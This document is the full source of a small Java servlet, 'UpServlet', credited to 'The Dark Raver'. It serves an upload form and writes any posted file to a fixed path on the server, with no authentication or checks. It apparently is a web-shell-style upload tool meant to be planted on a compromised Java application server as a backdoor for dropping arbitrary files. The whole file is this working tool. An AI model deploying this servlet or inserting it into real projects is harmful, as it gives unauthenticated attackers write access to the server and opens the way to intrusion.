/*
 * UpServlet.java	29/04/2005
 *
 * @author The Dark Raver
 * @version 0.1
 */

import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;


public class UpServlet extends HttpServlet {

    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
		res.setContentType("text/html");
		PrintWriter out = res.getWriter();
		out.print("<html><body>");
		out.print("<br><form method=\"POST\" action=\"\" enctype=\"multipart/form-data\">");
		out.print("UPLOAD <input type=\"file\" name=\"file\" size=\"60\">");
		out.print("<input type=\"submit\" value=\"Upload\">");
		out.print("</form>");
		out.print("</body></html>");
	}


    public void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
		String tag = new String();
		int c = '\0';
		int contador = 0;
		ServletInputStream in = req.getInputStream();
        DataInputStream post = new DataInputStream(in);

		PrintWriter out = res.getWriter();
		res.setContentType("text/html");
		out.print("<pre>");

		while((c=post.read()) != -1 && c != '\r' && c != '\n') {
			tag=tag.concat("" + (char)c);
			contador++;
			}

		for(int i=0; i <4; i++) while((c=post.read()) != -1 && c != '\n') contador++;

		// out.print("CONTENT_LEN = " + req.getContentLength() + " / TAG = [" + tag + "] / TAG_LEN = " + tag.length() + "\n");
		// out.print("CONTADOR = " + contador + " / FILE_LEN = " + (req.getContentLength() - tag.length() - contador - 11) + " ==>");

		// (!) Uploaded File Name

		File newfile = new File("c:\\install.log");

		/////////////////////////

		FileOutputStream fileout = new FileOutputStream(newfile);

		for(int i=0; i < req.getContentLength() - tag.length() - contador - 11; i++) {
			c=post.read();
			fileout.write((char)c);
			}

		fileout.close();
		out.print("<== OK");

    }


    public String getServletInfo() {
		return "UpServlet 0.1";
    }

}